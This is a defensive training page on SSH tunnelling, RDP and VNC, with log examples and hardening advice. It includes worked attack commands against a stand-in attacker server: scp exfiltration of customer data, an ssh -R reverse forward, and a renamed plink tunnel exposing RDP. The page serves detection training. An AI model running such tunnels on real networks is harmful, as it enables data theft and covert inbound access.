---
title: "SSH, Inbound Tunnelling over Outbound SSH, RDP and VNC"
tags:
  - training
  - blue-team
  - network
  - ssh
  - rdp
  - tunneling
  - lateral-movement
---

# SSH, Inbound Tunnelling over Outbound SSH, RDP and VNC { #ssh-rdp-vnc }

!!! abstract "What this page covers"
    Why SSH is both the administrator's best friend and one of the most dangerous protocols to leave unrestricted: the four tunnelling tricks (exfiltration over SFTP, a "poor man's VPN" with remote forwarding, pivoting through a dual-homed jump box with local or dynamic forwarding, and X11 forwarding), each shown as a real command broken down flag by flag. Then the scenario that surprises most people — **allowing SSH outbound is enough to give an attacker RDP inbound** — traced step by step through the plink command line, Sysmon 1 and 3, Zeek `conn.log` and `ssh.log`, and the tell-tale RDP logon from `127.0.0.1` (4624 type 10, 1149, 21/22/25). Finally RDP and VNC: why they suit attackers, how to prevent and monitor them, and what each log field means. Practice questions with explanations at the end.

!!! note "Labels"
    **[Supplement]** = practical material you need to know, **[Correction]** = a commonly repeated claim that is wrong or outdated, **[Changed]**/**[Caution]** = what has changed recently and what is risky to do the old way. Hostnames, domains, accounts, IPs and keys are invented for illustration (`.example`, documentation and private IPs).

## The 8 key points { #key-points }

1. SSH gives **dependable, encrypted remote access** with strong (public-key) authentication. That is exactly why administrators rely on it — and exactly why attackers love it.
2. SSH is not just a remote shell. It can **carry any other traffic inside its encrypted tunnel** (port forwarding), so whoever can open an SSH connection can move almost anything through it, and network tools can't see what.
3. Four abuses to know: **upload data out** (SCP/SFTP), **pull an outside machine into the inside network** (remote forwarding, `-R`), **reach a protected network through a dual-homed jump box** (local `-L` or dynamic `-D` forwarding), and **run GUI programs remotely** (X11 forwarding).
4. **Outbound SSH = inbound tunnelling.** If an internal PC may connect to any SSH server on the internet, an attacker can make that one outbound connection carry RDP (or anything else) **back in**. The firewall only ever sees an outbound SSH session.
5. The defence is **allow-listing**: who may use SSH, from which network segment, to which destinations. Block outbound SSH to arbitrary internet hosts, then **monitor what remains** — a small, well-defined set makes the odd connection stand out.
6. **RDP** (TCP 3389) gives a full graphical desktop. For attackers it **blends in** with normal admin work and needs only **a valid password or an exploit**.
7. Prevent RDP where it isn't needed (host and network firewalls, restricting which accounts may use it), and monitor what remains with **flow/firewall logs for 3389** and **Windows logon events** (4624 type 10, 4625, 1149, 21/22/24/25).
8. **VNC** (TCP 5900+) is a weaker, older remote-desktop protocol. In most organisations it should be **rare or banned**, so any VNC is worth investigating.

## SSH — the best friend and worst enemy { #ssh }

### What SSH is, and why it is good { #what-is-ssh }

SSH (Secure Shell, TCP 22 by default) replaced Telnet and rlogin, which sent passwords in clear text. An SSH session does three things:

1. **Encrypts everything** between client and server, after a key exchange.
2. **Authenticates the server** with its host key (the "fingerprint" you are asked to accept the first time), so you know you are not talking to an impostor.
3. **Authenticates the user**, ideally with a key pair: the private key stays on your machine, the public key sits in `~/.ssh/authorized_keys` on the server.

Then, inside that one encrypted connection, SSH can open **many channels**: a shell, a file transfer (SFTP/SCP), and **forwarded TCP connections**. That last feature is the whole story of this page.

An analogy: SSH is an **armoured, locked delivery van** between two buildings. Security at the gate can see the van leave and arrive, but not what is inside. The van was built to carry the admin's toolbox. But nothing stops someone from loading it with boxes of files, or even running a hidden passenger corridor through it back into the building. Technically: the gate is your firewall or proxy, the van is the TCP connection to port 22, and the cargo is SSH channels that only the two ends can decrypt.

### What a normal SSH login looks like { #normal-ssh }

On a Linux server, a normal key-based login writes to `/var/log/auth.log` (Debian/Ubuntu) or `/var/log/secure` (RHEL family), or to the journal (`journalctl -u ssh` / `-u sshd`):

```
Nov 18 21:03:44 srv-web-0003 sshd[48211]: Accepted publickey for deploy from 10.20.40.15 port 51522 ssh2: ED25519 SHA256:Qm4b1X8r0yGzM2v7cH9pT3kLwA5nE6sJdUfR0oVi8Yc
Nov 18 21:03:44 srv-web-0003 sshd[48211]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
Nov 18 21:41:09 srv-web-0003 sshd[48211]: pam_unix(sshd:session): session closed for user deploy
```

- `sshd[48211]` — the SSH server process and its PID; all lines with the same PID belong to one session.
- `Accepted publickey for deploy` — user `deploy` logged in **with a key**. `Accepted password` would mean password login (weaker; should be off on most servers).
- `from 10.20.40.15 port 51522` — the client's IP and source port. That should be an admin workstation or jump host, not a random PC.
- `ED25519 SHA256:Qm4b…` — the **fingerprint of the user's key**. You can match it to a known person's key in `authorized_keys`; an unknown fingerprint means someone added a key (a common persistence trick).
- `session opened` / `session closed` — start and end; here about 38 minutes.

A failed guess looks like `Failed password for invalid user admin from 198.51.100.23 port 40122 ssh2`. Hundreds of those from one address is brute force; a single `Accepted` after them from the same address is a compromise.

On the network, Zeek writes an `ssh.log` entry per session (see also [Zeek conn.log](../../../network/zeek/conn-log.md)):

```
ts=2026-11-18T21:03:44Z uid=Cx9Lk2 id.orig_h=10.20.40.15 id.orig_p=51522 id.resp_h=10.20.0.31 id.resp_p=22 version=2 auth_success=T auth_attempts=1 direction=- client=SSH-2.0-OpenSSH_9.6p1 server=SSH-2.0-OpenSSH_9.6p1 cipher_alg=chacha20-poly1305@openssh.com kex_alg=sntrup761x25519-sha512 host_key=7f:2a:…:c1
```

- `auth_success=T`, `auth_attempts=1` — Zeek **infers** from packet sizes whether authentication succeeded (it can't decrypt). Many attempts and `F` = guessing.
- `direction` — `INBOUND`/`OUTBOUND` relative to your network, if the sensor knows which ranges are local.
- `client` / `server` — the version banners each side sends in clear text before encryption starts. **`SSH-2.0-PuTTY_Release_0.81`** or **`SSH-2.0-PLINK…`**-style strings, Go/Paramiko libraries (`SSH-2.0-Go`, `SSH-2.0-paramiko_3.4.0`) or odd banners from a workstation are interesting.
- `kex_alg`, `cipher_alg`, `host_key` — the algorithms agreed and the server's host key fingerprint. A **new host key** for a server you know may mean the server was rebuilt — or that someone is in the middle.

What Zeek can **not** tell you: commands typed, files moved, or whether ports were forwarded. That is the defender's core problem with SSH.

### The four tunnelling tricks { #ssh-tunnels }

#### 1. Exfiltration over SCP/SFTP { #exfil }

```
$ scp -r /srv/exports/customers/ backup@203.0.113.77:/data/drop/
```

- `scp` — secure copy over SSH. `-r` = recursive (whole folder).
- `/srv/exports/customers/` — what is leaving.
- `backup@203.0.113.77:/data/drop/` — user `backup` on a server **the attacker controls**, and the destination folder.

On the wire it is just encrypted SSH to `203.0.113.77:22`. No DLP or proxy can read it. What you **can** see: a server or workstation that never talks SSH to the internet suddenly does, and `conn.log` shows **far more bytes out (`orig_bytes`) than in**:

```
ts=2026-11-18T23:10:02Z uid=CaR7q1 id.orig_h=10.20.0.44 id.resp_h=203.0.113.77 id.resp_p=22 proto=tcp service=ssh duration=1832.4 orig_bytes=4718592000 resp_bytes=6291456 conn_state=SF
```

`orig_bytes=4718592000` is about 4.4 GB sent, `resp_bytes` about 6 MB received, over half an hour. That ratio is an upload.

#### 2. The "poor man's VPN" — remote forwarding (`-R`) { #remote-forward }

```
$ ssh -N -R 2222:127.0.0.1:22 tun@203.0.113.77
```

- `-N` — don't run a shell; this connection exists only to carry the tunnel.
- `-R 2222:127.0.0.1:22` — **remote** forward: "open port `2222` on the **far** server; whatever connects there, send it back through this tunnel to `127.0.0.1:22` **on my side**."
- `tun@203.0.113.77` — the attacker's server.

The internal machine dialled **out**, so the firewall is happy. But now the attacker, sitting on `203.0.113.77`, types `ssh -p 2222 user@127.0.0.1` and lands **inside** the network. Add `-D` (below) on top and their machine behaves as if plugged into the internal LAN. The direction of the TCP connection (outbound) and the direction of control (inbound) are opposite — that is why it fools people.

#### 3. Pivoting through a dual-homed jump box — local (`-L`) and dynamic (`-D`) forwarding { #local-forward }

A dual-homed jump box has one interface in the normal network and one in a protected one (for example an OT or management network, `10.50.0.0/24`). It is meant to be the only, controlled way in. But:

```
$ ssh -N -L 8443:10.50.0.15:443 ops@jump01.corp.example
$ ssh -N -D 1080 ops@jump01.corp.example
```

- Line 1, `-L 8443:10.50.0.15:443` — **local** forward: "open port `8443` **on my machine**; anything sent there goes through the jump box to `10.50.0.15:443`." Browsing to `https://127.0.0.1:8443` now reaches a protected web console directly.
- Line 2, `-D 1080` — **dynamic** forward: a SOCKS proxy on local port `1080`. Any tool set to use that proxy can reach **any** host the jump box can reach. One SSH login to the jump box exposes the entire protected network, far beyond the "jump box only" design.

On the jump box itself, OpenSSH logs at default level don't record forwarding requests; you need `LogLevel VERBOSE` or higher (or restrict forwarding, below).

#### 4. X11 forwarding { #x11 }

```
$ ssh -X analyst@lnx-dev-0102.corp.example firefox
```

`-X` asks the server to send the **window** of a graphical program back to your screen. Here a browser runs **on the remote machine** — with its network position, its cookies, its access — but is displayed to the person who logged in. Useful for admins; also a neat way for an attacker to drive a GUI app on a victim from afar.

### Locking SSH down { #ssh-defence }

The technical controls behind "allow-list it":

- **Network:** block outbound TCP 22 (and SSH on other ports — your next-gen firewall's application ID, not just the port) except to approved destinations. Allow inbound SSH to servers only from admin subnets or jump hosts.
- **Server side (`sshd_config`):**

```
PasswordAuthentication no
PermitRootLogin no
AllowGroups ssh-admins
AllowTcpForwarding no
GatewayPorts no
X11Forwarding no
PermitTunnel no
LogLevel VERBOSE
```

  - `PasswordAuthentication no` — keys only, so password guessing is pointless.
  - `PermitRootLogin no` — no direct root login; admins log in as themselves and elevate (accountability).
  - `AllowGroups ssh-admins` — only members of that group may log in.
  - `AllowTcpForwarding no`, `GatewayPorts no`, `X11Forwarding no`, `PermitTunnel no` — switch off the tunnelling features on servers that don't need them (most). On a jump box you may need forwarding, but you can limit destinations with `PermitOpen`.
  - `LogLevel VERBOSE` — logs key fingerprints and more detail per login.

- **Monitor what remains:** new SSH destinations, SSH from workstations, long-lived SSH sessions, unusual client banners, big outbound byte counts, and SSH client processes on Windows (`ssh.exe`, `plink.exe`, `putty.exe`) started by unusual parents.

<strong>[Correction]</strong> "SSH only matters on Linux." Windows 10 (1809) and later, and Windows Server 2019 and later, ship with the **OpenSSH client `ssh.exe` installed by default** in `C:\Windows\System32\OpenSSH\`. An attacker on a Windows PC no longer needs to bring PuTTY/plink — the tunnel tool is already there and Microsoft-signed.

## Outbound SSH = inbound tunnelling { #outbound-ssh }

### The scenario { #tunnel-scenario }

A well-known incident write-up from 2019 (by the incident response team then called FireEye, now Mandiant) described a group that did exactly this: the victim network allowed outbound SSH to anywhere, so the attackers used **plink** (PuTTY's command-line client) on an internal Windows machine to build an SSH connection to their own server with a **remote forward pointing at the victim's own RDP port**. Anything the attackers sent into the tunnel on their side came out on the victim side at `127.0.0.1:3389`. Result: **RDP across the internet into an internal PC**, even though the firewall blocked all inbound RDP.

```
  Attacker's laptop                     Attacker's SSH server                Victim network (firewall: outbound 22 allowed)
 ┌───────────────┐   RDP to         ┌──────────────────────┐    SSH (one TCP     ┌──────────────────────────────┐
 │ mstsc ───────▶│ 203.0.113.77:    │ 203.0.113.77         │ ◀═══════════════════│ LT-ENG-0207  10.20.30.88     │
 │               │ 12345 ──────────▶│ listening :12345     │   connection,       │ plink -R 12345:127.0.0.1:3389│
 └───────────────┘                  │ → into the tunnel    │   started from      │   │                          │
                                    └──────────────────────┘   the inside)       │   ▼ out of the tunnel to     │
                                                                                 │   127.0.0.1:3389 (own RDP)   │
                                                                                 └──────────────────────────────┘
```

The command on the victim:

```
C:\Users\p.lee\AppData\Local\Temp\svch.exe -batch -hostkey "SHA256:R2c…9vQ" -l tun -pw S3cr3t! -P 443 -R 12345:127.0.0.1:3389 203.0.113.77
```

Piece by piece:

- `svch.exe` from a user's `Temp` — plink, **renamed** to look like a Windows file.
- `-batch` — never ask the user anything (no prompts on screen to give it away).
- `-hostkey "SHA256:…"` — pre-accept the attacker server's host key so there is no "trust this host?" prompt.
- `-l tun -pw S3cr3t!` — log in to the attacker's server as `tun` with this password. (The password on the command line is a gift to you: it appears in 4688/Sysmon 1.)
- `-P 443` — use port **443** instead of 22, so a port-only firewall rule thinks it's HTTPS. An application-aware firewall or Zeek still sees **SSH**, because the SSH banner is clear text.
- `-R 12345:127.0.0.1:3389` — the core: open `12345` on the attacker's server and deliver what arrives to **this PC's own RDP**.
- `203.0.113.77` — the attacker's server.

The same with Windows' built-in client would be `ssh.exe -N -o StrictHostKeyChecking=no -p 443 -R 12345:127.0.0.1:3389 tun@203.0.113.77`.

And it isn't limited to RDP. `-R 12345:10.20.0.20:445` would expose the file server's SMB; `-R 1080` (newer OpenSSH, a reverse SOCKS proxy) exposes **every** internal address. **All of it looks like one encrypted outbound session.** Unless you detect it at the endpoint where the tunnel ends, you can't tell what's inside.

### The traces it leaves { #tunnel-traces }

**1. Process creation on `LT-ENG-0207` — Sysmon 1 (or Security 4688 with command-line logging):**

```
Event ID: 1   Process Create
UtcTime:      2026-11-18 13:22:51.004
Image:        C:\Users\p.lee\AppData\Local\Temp\svch.exe
OriginalFileName: Plink
CommandLine:  svch.exe -batch -hostkey "SHA256:R2c…9vQ" -l tun -pw S3cr3t! -P 443 -R 12345:127.0.0.1:3389 203.0.113.77
User:         CORP\p.lee
ParentImage:  C:\Windows\System32\cmd.exe
Hashes:       SHA256=4B1F…E0A2
```

- **Sysmon 1** = a process started, with full command line and hash. **4688** is the built-in equivalent (enable "Audit Process Creation" and "Include command line in process creation events").
- `OriginalFileName: Plink` — taken from the file's version resource, so **renaming doesn't hide it**. A mismatch between `Image` name and `OriginalFileName` is a classic detection.
- `CommandLine` containing `-R` with `3389` (or `127.0.0.1:` anything) is about as clear as an alert gets.

**2. The outbound connection — Sysmon 3:**

```
Event ID: 3   Network connection detected
Image:           C:\Users\p.lee\AppData\Local\Temp\svch.exe
SourceIp:        10.20.30.88
DestinationIp:   203.0.113.77
DestinationPort: 443
```

A non-browser binary from Temp talking to an internet IP on 443.

**3. On the wire — Zeek `conn.log` and `ssh.log`:**

```
# conn.log
ts=2026-11-18T13:22:51Z uid=CtUn01 id.orig_h=10.20.30.88 id.resp_h=203.0.113.77 id.resp_p=443 proto=tcp service=ssh duration=14420.7 orig_bytes=182400211 resp_bytes=21733904 conn_state=SF

# ssh.log
ts=2026-11-18T13:22:51Z uid=CtUn01 id.orig_h=10.20.30.88 id.resp_h=203.0.113.77 id.resp_p=443 auth_success=T client=SSH-2.0-PuTTY_Release_0.81 server=SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3
```

- `id.resp_p=443` but `service=ssh` — **SSH on the HTTPS port**. Zeek identifies the protocol by content, not by port. That mismatch alone is worth an alert.
- `duration=14420.7` — four hours in one connection. Interactive SSH from a workstation to the internet is rare; four hours is a tunnel.
- `resp_bytes` around 21 MB coming **in** and 182 MB going **out** — consistent with RDP: screen updates flow from the victim (the RDP server) out to the attacker.
- `client=SSH-2.0-PuTTY_Release_0.81` — a PuTTY-family client on an engineering laptop that is supposed to have no SSH use.

**4. The RDP logon arriving "from itself" — the endpoint is where the tunnel ends.** On `LT-ENG-0207`:

```
Security 4624   An account was successfully logged on
Logon Type:              10
Account Name:            p.lee          Account Domain: CORP
Logon ID:                0x7A21C33
Workstation Name:        -
Source Network Address:  127.0.0.1
Source Port:             0
```

- **4624** = successful logon. `Logon Type 10` = **RemoteInteractive**, i.e. RDP (2 = at the keyboard, 3 = network such as SMB).
- `Source Network Address: 127.0.0.1` — the RDP session **came from the machine itself**. A real user doesn't RDP into their own laptop via loopback. **RDP logon from 127.0.0.1 or ::1 is the signature of a tunnel.**
- Where did the credentials come from? Here the attacker reused `p.lee`'s password (stolen earlier). With Network Level Authentication on, you'll often also see a **type 3** logon just before the type 10 for the same user — the NLA pre-authentication.

```
Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational  1149
Remote Desktop Services: User authentication succeeded:
User: p.lee   Domain: CORP   Source Network Address: 127.0.0.1

Microsoft-Windows-TerminalServices-LocalSessionManager/Operational  21 / 22 / 25
Session logon succeeded / Shell start notification received / Session reconnection succeeded
User: CORP\p.lee   Session ID: 3   Source Network Address: 127.0.0.1
```

- **1149** — RDP network authentication succeeded. Despite the wording it is logged **before** the full logon completes; it's the "someone authenticated to the RDP listener" record, with the source address.
- **21** session logon succeeded, **22** shell (desktop) started, **24** session disconnected, **25** session **reconnected**. Again: source `127.0.0.1`.

Put on a timeline:

```
13:22:51  Sysmon 1   svch.exe (OriginalFileName Plink) -R 12345:127.0.0.1:3389 203.0.113.77
13:22:51  Sysmon 3   svch.exe -> 203.0.113.77:443
13:22:52  Zeek       conn/ssh: 10.20.30.88 -> 203.0.113.77:443 service=ssh, PuTTY client
13:31:07  1149       RDP auth succeeded, p.lee, from 127.0.0.1
13:31:07  4624       type 10, p.lee, from 127.0.0.1
13:31:08  21 / 22    session logon, shell start, from 127.0.0.1
17:23:12  Zeek       conn closes after 14420 s
```

Notice the eight-minute gap: the tunnel was up first, then the attacker connected through it. The firewall saw nothing but one outbound "HTTPS" connection.

### Detecting and stopping it { #tunnel-defence }

- **Prevent:** block outbound SSH by **application identity**, not just port 22 — the SSH banner is clear text, so next-gen firewalls and Zeek recognise SSH on any port. Allow it only to named destinations for named teams.
- **Detect at the network:** `service=ssh` on a port other than 22; SSH from workstations to the internet; very long SSH sessions; new external SSH destinations.
- **Detect at the endpoint:** RDP logons (4624 type 10, 1149, 21/25) from `127.0.0.1`/`::1`; `ssh.exe`/`plink.exe` command lines containing `-R`, `-L`, `-D` or `-N`; renamed binaries (`OriginalFileName` mismatch); PuTTY's saved host keys in `HKCU\Software\SimonTatham\PuTTY\SshHostKeys` for unknown servers.
- **Reduce blast radius:** disable RDP on machines that don't need it (most workstations), so a tunnel to `127.0.0.1:3389` finds nothing listening.

## RDP — Remote Desktop Protocol { #rdp }

### Why attackers like it { #rdp-why }

RDP (TCP 3389, and UDP 3389 for faster graphics) gives a **full graphical desktop**. It is common, often on by default on servers in enterprise networks, and used daily by admins. For an attacker that means:

- **It blends in.** An RDP session looks like an admin doing their job.
- **It's a GUI.** The attacker can use any program the way a user would — open the management consoles, browse shares, disable the antivirus in its settings window.
- **It needs either a valid password or an exploit.** Passwords are the usual way in: stolen, phished, bought, guessed against an internet-exposed 3389, or dumped from LSASS on another machine. Exploits do happen (the 2019 "BlueKeep" bug, CVE-2019-0708, was wormable on old Windows), but credentials are far more common.

Analogy: RDP is like handing someone **your seat at your desk** — monitor, keyboard and all — from anywhere. Technically: a 4624 **type 10** session with its own desktop, clipboard and (optionally) drive redirection, on TCP 3389.

### Preventing RDP abuse { #rdp-prevent }

- **Turn it off where it's not needed.** Most workstations don't need inbound RDP: `HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections = 1`, or by Group Policy.
- **Firewall it.** Host firewall: allow 3389 only from admin jump hosts. Network firewall: **never expose 3389 to the internet**; put it behind a VPN or a Remote Desktop Gateway with MFA.
- **Limit who may use it.** Only members of `Remote Desktop Users` (and Administrators) can log on via RDP, controlled by the user right "Allow log on through Remote Desktop Services". Remove broad groups such as `Domain Users`; use "Deny log on through Remote Desktop Services" for service accounts and local accounts.
- **Require NLA** (Network Level Authentication), so the user authenticates before the server builds a session — less exposed code, and less to brute-force.

### Monitoring the RDP that remains { #rdp-monitor }

Ask the question: **who should be using RDP here, from where, to where?** Then compare with reality.

**Flow and firewall logs for 3389:**

```
ts=2026-11-19T02:14:31Z uid=CrD441 id.orig_h=10.20.30.41 id.resp_h=10.20.30.77 id.resp_p=3389 proto=tcp service=ssl duration=2611.3 orig_bytes=4119026 resp_bytes=58420113 conn_state=SF
```

- `10.20.30.41 → 10.20.30.77:3389` — **workstation to workstation**. Admin RDP normally comes from jump hosts to servers.
- `service=ssl` — modern RDP wraps itself in TLS, so Zeek often labels it SSL; Zeek also has an `rdp.log` that records the client name, keyboard layout and security protocol when it can see the start of the connection.
- `02:14` local night time, 43 minutes, ~58 MB from the server (screen updates) — an interactive session at 2 a.m.

**Windows events on the destination:**

| Event | Log | Meaning | Why it matters |
| --- | --- | --- | --- |
| 4624 type 10 | Security | RDP logon succeeded (type 7 on reconnect/unlock is also common) | Who logged on and from which IP |
| 4625 type 10 (or 3 with NLA) | Security | Failed logon | Many from one IP = brute force or spraying |
| 1149 | TerminalServices-RemoteConnectionManager | RDP network authentication succeeded | Source IP even when 4624 is missing or rotated |
| 21 / 22 / 24 / 25 | TerminalServices-LocalSessionManager | Session logon / shell start / disconnect / reconnect | Session timeline |
| 4778 / 4779 | Security | Session reconnected / disconnected | Shows hopping in and out of a session, with client name |
| 1024 / 1102 | TerminalServices-RDPClient (on the **source**) | This machine started an RDP connection to … | Proves outbound RDP from a compromised host |

Things that should make you look twice: RDP between workstations; RDP from a host that isn't a jump box; logons at odd hours; one account RDPing to many hosts quickly; RDP from `127.0.0.1`/`::1` (tunnel); and an RDP source IP that maps (via [DHCP](dhcp.md)) to a device that shouldn't administer anything. More technique detail: [RDP abuse](../../../adversary/rdp.md).

## VNC { #vnc }

VNC (Virtual Network Computing) shares a screen using the **RFB** protocol, by default on **TCP 5900** plus the display number (display `:1` = 5901, and so on), with a web viewer often on 5800. Many free and commercial versions exist (TightVNC, UltraVNC, RealVNC, TigerVNC).

Why it should be rarer than RDP:

- **Weak authentication.** Classic VNC authentication is a challenge-response using DES with a password **truncated to 8 characters**; some setups have **no password at all**. There is no account — just one shared password for the screen.
- **Weak or no encryption** in many versions unless wrapped in SSH or TLS.
- **A long list of vulnerabilities** across implementations, and many VNC servers exposed to the internet.

The start of a VNC session is plain text, so it is easy to spot:

```
server → client:  RFB 003.008\n
client → server:  RFB 003.008\n
server → client:  security types: [2] (VNC Authentication)
```

- `RFB 003.008` — the protocol version banner (3.8). Seeing `RFB` at the start of a TCP stream means VNC, whatever the port.
- Security type `2` = classic VNC authentication (DES challenge); type `1` = **None** (no password).

Everything said about RDP applies, with one difference: VNC should be **unusual or outright against policy**. Look for port 5900–5910 in flow logs, anything your firewall's application ID labels as VNC, Zeek's `rfb.log`, and VNC server services or processes (`winvnc.exe`, `tvnserver.exe`) on Windows hosts. An attacker installing a VNC server is giving themselves a second, quieter way back in.

## The 2026 view { #trends }

!!! success "[2026 Current] Still valid"
    Everything here still holds. SSH is still the standard remote-administration protocol for Linux, network gear and cloud VMs, and its port forwarding still lets one outbound connection carry anything back in. Allowing outbound SSH to arbitrary hosts is still a hole, and the 127.0.0.1 RDP logon is still the giveaway of a reverse tunnel. RDP is still one of the most abused remote services — in incident-response data covering 2024, RDP was involved in **84%** of cases, the most frequently abused Microsoft tool — and stolen credentials, not exploits, are still the usual key. VNC is still weak and still best kept off the network.

!!! info "[Changed] What has changed"
    - **The SSH client is built into Windows.** Since Windows 10 1809 / Server 2019 `ssh.exe` is present by default, so attackers increasingly "live off the land" with Microsoft's own signed OpenSSH instead of carrying plink. Detections must cover both.
    - **OpenSSH has modernised.** OpenSSH 10.0 (April 2025) removed DSA keys entirely and made a **hybrid post-quantum key exchange** (`mlkem768x25519-sha256`) the default, after earlier versions defaulted to `sntrup761x25519-sha512`. In Zeek `ssh.log` you'll see these `kex_alg` values from modern clients; very old algorithms suggest old or unusual tools. The 2024 **regreSSHion** bug (CVE-2024-6387, a remote unauthenticated code-execution race in `sshd` on glibc Linux) was a reminder that exposed SSH servers must be patched quickly.
    - **Tunnels moved beyond SSH.** Attackers now also use legitimate tunnelling services and tools (Cloudflare Tunnel `cloudflared`, ngrok, Tailscale-style mesh VPNs, reverse proxies such as Chisel or Ligolo-ng) to achieve exactly the inbound-through-outbound trick, often over HTTPS or WebSockets. Look for these binaries and their well-known domains, not just SSH.
    - **RDP files as phishing.** In October 2024 Microsoft reported a large spear-phishing campaign by a state actor sending signed `.rdp` attachments that connected victims to attacker RDP servers and redirected their drives and clipboard. In April 2026 Windows updates added protections: opening an `.rdp` file now shows the publisher (or "Unknown publisher"), lists every requested redirection, and those redirections are **off by default** until the user approves them. Block `.rdp` attachments at the mail gateway and outbound 3389 to the internet.
    - **FireEye is now Mandiant (part of Google Cloud).** Older links to the FireEye blog have moved.

!!! warning "[Caution] Wrong or risky to do the old way"
    - **Don't rely on "port 22 blocked outbound."** SSH runs on 443 or any other port. Block by application identity and allow-list destinations.
    - **Don't hunt only for `plink.exe`.** It gets renamed, and `ssh.exe` is already on every modern Windows machine. Hunt command-line flags (`-R`, `-L`, `-D`, `-N`) and `OriginalFileName`.
    - **Don't treat RDP behind NLA as "safe enough" on the internet.** NLA reduces exposure but doesn't stop credential stuffing. Put RDP behind a VPN or gateway with MFA.
    - **Don't assume RDP logs are where you expect.** The `TerminalServices-*` logs are small and roll over quickly, and attackers clear them; forward 4624/4625, 1149 and 21–25 to your SIEM.
    - **Don't leave VNC "just for that one vendor."** If a vendor needs remote access, give them a monitored, MFA-protected method — an unmanaged VNC server is an open side door.

## Practice questions { #quiz }

### Question 1

Your firewall blocks all inbound connections from the internet, but allows outbound TCP 22 to anywhere. A manager says, "Inbound is blocked, so nobody outside can RDP into our PCs." Explain why that's wrong, using the exact command an attacker would run, and give two controls that fix it.

??? success "Answer and explanation"
    **Why it's wrong:** SSH can carry other traffic. An attacker with code running on one internal PC runs something like `ssh.exe -N -R 12345:127.0.0.1:3389 tun@203.0.113.77` (or plink with `-R`). The internal PC opens an **outbound** SSH connection — allowed — and asks the attacker's server to listen on port `12345` and send whatever arrives back through the tunnel to the PC's own RDP port `127.0.0.1:3389`. The attacker then RDPs to `203.0.113.77:12345` and lands on the internal desktop. The firewall only ever sees an outbound SSH session, and it's encrypted, so it can't see RDP inside.

    **Controls:** (1) **Allow-list outbound SSH** by application identity (any port) to approved destinations only, for approved teams. (2) **Disable RDP on workstations** that don't need it, so the tunnel finds nothing to connect to. Also detect: RDP logons from `127.0.0.1`, SSH client command lines with `-R`, and long SSH sessions from workstations.

### Question 2

On `LT-ENG-0207` you see a 4624 with `Logon Type 10`, `Account Name p.lee`, `Source Network Address ::1`, and a TerminalServices 1149 for the same user with the same source. Zeek shows a 3-hour connection from that laptop to `198.51.100.40:443` with `service=ssh`. What happened and what do you do next?

??? success "Answer and explanation"
    **What happened:** `Logon Type 10` is an RDP (RemoteInteractive) logon, and `::1` is the IPv6 loopback — the RDP session came **from the laptop itself**. That only happens when something on the laptop forwards RDP into itself: a **reverse tunnel**. The Zeek record confirms it: **SSH on port 443** (Zeek recognised the protocol by its banner) to an internet host for three hours. Someone outside is using `p.lee`'s credentials to RDP in through an SSH tunnel the laptop built outward.

    **Next steps:** isolate the laptop (cutting the tunnel); find the tunnel process with Sysmon 1/4688 and Sysmon 3 for `198.51.100.40` (command line with `-R`, `OriginalFileName` Plink or `ssh.exe`, its parent process to find how it got there); block `198.51.100.40` and look for other internal hosts talking to it; treat `p.lee`'s password as stolen and reset it (and check where else it was used); review what was done during the RDP session (process creation under that Logon ID, 4778/4779, files touched).

### Question 3

For each, say whether it's a concern and why: (a) `Accepted publickey for deploy from 10.20.40.15` on a web server, where `10.20.40.15` is the admin jump host; (b) Zeek shows `RFB 003.008` traffic to TCP 5901 on a finance PC; (c) a 4624 type 10 on file server `SRV-FS-0001` from `10.20.30.41`, a normal user's laptop, at 02:14.

??? success "Answer and explanation"
    **(a)** Normal, as long as the key fingerprint belongs to a known admin and the time fits. Key-based login from the jump host is what a well-defined SSH setup should look like. Worth checking only if the fingerprint is unknown (a planted key).

    **(b)** **A concern.** `RFB` is the VNC protocol, and 5901 is VNC display `:1`. VNC has weak authentication (an 8-character DES password, sometimes none) and should be rare or banned. A VNC server on a finance PC could be a forgotten vendor tool or an attacker's backdoor. Find the process listening on 5901, who installed it and when, and who has been connecting.

    **(c)** **A concern.** Type 10 is RDP. Admin RDP should come from jump hosts, not a normal user's laptop, and 2 a.m. is unusual. Check which account logged on, whether that account should have RDP rights to the file server, what `10.20.30.41` was doing beforehand (it may be compromised — remember it was the phished laptop in the SMB example), and what happened in the session.

## Related { #related }

- [RDP abuse](../../../adversary/rdp.md) · [WMI and WinRM](../../../adversary/wmi-winrm.md) · [PsExec and SMB lateral movement](../../../adversary/psexec-smb.md)
- [LSASS dumping](../../../adversary/lsass-dumping.md) — where the reused passwords usually come from
- [Living off the land binaries](../../../adversary/lolbins.md)
- [Windows event IDs](../../../basics/windows-event-ids.md) · [Well-known ports](../../../basics/well-known-ports.md)
- [Zeek conn.log](../../../network/zeek/conn-log.md)
- [DHCP](dhcp.md) · [SMB](smb.md)
